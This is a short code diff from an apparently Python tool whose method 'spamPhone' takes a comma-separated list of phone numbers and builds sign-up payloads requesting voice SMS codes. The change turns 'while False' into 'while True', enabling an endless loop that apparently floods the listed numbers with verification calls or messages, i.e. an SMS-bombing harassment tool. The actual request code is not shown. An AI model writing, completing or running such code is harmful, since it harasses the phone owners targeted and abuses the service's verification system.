@@ -75,7 +75,7 @@ class App:
     def spamPhone(self,arrPhone):
         sdt = arrPhone.split(",")
         i=0
-        while False:
+        while True:
             try:
                 phone = sdt[i]
                 pload = {"mobilePhone":phone,"password":"R2mpP2.EdLS#i5","passwordConfirmation":"R2mpP2.EdLS#i5","isVoiceSms":True}
